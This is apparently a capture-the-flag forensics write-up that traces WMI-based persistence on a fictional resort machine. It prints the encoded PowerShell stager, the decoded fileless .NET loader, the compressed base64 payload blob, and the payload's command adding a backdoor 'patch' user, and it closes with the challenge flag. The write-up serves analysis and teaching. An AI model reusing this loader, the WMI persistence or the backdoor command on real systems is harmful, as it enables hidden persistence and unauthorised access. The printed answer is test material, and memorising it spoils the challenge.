# Hacker Holidays: Day 12 - After Hours

**Category:** Forensics
**Difficulty:** Medium
**Points:** 90

## 🛎️ Concierge Briefing
Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.
Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.

---

## 🕵️‍♂️ Initial Analysis
We are provided with a directory containing the following files:
- `INDEX.BTR`
- `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`
- `OBJECTS.DATA`

These files are typical artifacts of a **Windows Management Instrumentation (WMI) Repository**, typically found in `C:\Windows\System32\wbem\Repository`. The challenge briefing mentions that standard persistence tools (like Autoruns) don't catch this persistence, which is a classic indicator of WMI-based persistence (often implemented via an `__EventFilter`, `__EventConsumer`, and a `__FilterToConsumerBinding`).

## 🛠️ Step 1: Hunting for the Persistence Mechanism
Since we know we are dealing with WMI files, we can start by searching the `OBJECTS.DATA` file for common execution keywords like `powershell`, `cmd`, or `base64`. 

Using PowerShell's `Select-String`, we can search through the raw data:
```powershell
Select-String -Path "OBJECTS.DATA" -Pattern "powershell|cmd\.exe|base64" -CaseSensitive:$false
```

This search reveals an interesting `CommandLineEventConsumer` containing an encoded PowerShell payload:
```cmd
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBIAGEAcgBkAHcAYQByAGUAVABlAGwAZQBtAGUAdAByAHkAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAG4AZgBpAGcARABhAHQAYQAnAF0ALgBWAGEAbAB1AGUAOwANAAoAJABvACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAkAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApADsADQAKACQAYgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAOwANAAoAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAHcAaABpAGwAZQAoACQAcgAgAC0AZwB0ACAAMAApAHsADQAKACAAIAAgACAAJABvAC4AVwByAGkAdABlACgAJABiACwAMAAsACQAcgApADsADQAKACAAIAAgACAAJAByACAAPQAgACQAZAAuAFIAZQBhAGQAKAAkAGIALAAwACwAMQAwADIANAApADsADQAKAH0ADQAKAFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgAJABvAC4AVABvAEEAcgByAGEAeQAoACkAKQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsAEAAKAAsAFsAcwB0AHIAaQBuAGcAWwBdAF0AQAAoACkAKQApAHwATwB1AHQALQBOAHUAbABsAA==
```

## 🔓 Step 2: Decoding the Stager
Let's decode this Base64 blob to see what the PowerShell script is actually doing:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABmAGkAbABlACAAPQAgAC...'))
```

The decoded PowerShell script looks like this:
```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```
This is a classic fileless malware loader! It reaches into a custom WMI class named `Win32_HardwareTelemetry`, grabs a Base64-encoded string from the `ConfigData` property, decompresses it, and loads it directly into memory as a .NET assembly.

## 🧩 Step 3: Extracting the Embedded Payload
Now we need to find that `Win32_HardwareTelemetry` class in `OBJECTS.DATA` and grab the `ConfigData` value.

A quick search for `Win32_HardwareTelemetry` in `OBJECTS.DATA` brings us to this massive Base64 string:
```text
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
```

To figure out what this file is, we can replicate the attacker's PowerShell loader to extract and dump the file to disk instead of executing it:
```powershell
$b64 = "7VZPbFRFGP..." # (Insert the full base64 string here)
$bytes = [Convert]::FromBase64String($b64)
$ms = New-Object IO.MemoryStream(,$bytes)
$ds = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)
$msOut = New-Object IO.MemoryStream
$ds.CopyTo($msOut)
[IO.File]::WriteAllBytes("payload.dll", $msOut.ToArray())
```
This extracts a 4KB .NET Assembly file (`payload.dll` / `updates.exe`).

## 🚩 Step 4: Decoding the Payload & Securing the Flag
Now that we have the uncompressed executable, we can run a string extraction on it to see what commands it's running:
```powershell
$bytes = [System.IO.File]::ReadAllBytes("payload.dll")
[System.Text.Encoding]::ASCII.GetString($bytes) -split "`0" | Where-Object { $_.Length -gt 4 }
```

Looking through the output, we find this highly suspicious command line string:
```text
cmd.exe?/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
```

The payload is adding a backdoor user named `patch`, and it's passing `VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9` as the password! That looks exactly like a Base64 encoded string.

Decoding it gives us our final flag:
```bash
echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
```

**Flag:** `THM{P4tch_op3ned_th3_BacKd00r}`
